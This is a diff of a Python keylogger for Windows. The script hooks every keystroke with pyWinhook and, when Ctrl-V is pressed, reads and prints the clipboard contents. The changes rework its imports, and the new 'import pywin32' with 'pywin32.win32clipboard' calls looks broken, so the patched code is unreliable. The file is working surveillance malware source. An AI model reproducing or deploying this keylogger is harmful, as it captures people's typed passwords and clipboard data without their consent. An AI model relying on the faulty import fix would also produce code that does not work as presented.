@@ -1,7 +1,7 @@
 from ctypes import *
 import pythoncom
 import pyWinhook as pyhook
-from pywin32 import win32clipboard
+import pywin32
 
 user32 = windll.user32
 kernel32 = windll.kernel32
@@ -58,9 +58,9 @@ def KeyStroke(event):
         # if [Ctrl-V], get the value on the clipboard
         # added by Dan Frisch 2014
         if event.Key == "V":
-            win32clipboard.OpenClipboard()
-            pasted_value = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
+            pywin32.win32clipboard.OpenClipboard()
+            pasted_value = pywin32.win32clipboard.GetClipboardData()
+            pywin32.win32clipboard.CloseClipboard()
             print("[PASTE] - %s" % pasted_value, end=' ')
         else:
             print("[%s]" % event.Key, end=' ')
@@ -70,7 +70,7 @@ def KeyStroke(event):
 
 
 # create and register a hook manager
-kl = pyHook.HookManager()
+kl = pyhook.HookManager()
 kl.KeyDown = KeyStroke
 
 # register the hook and execute forever
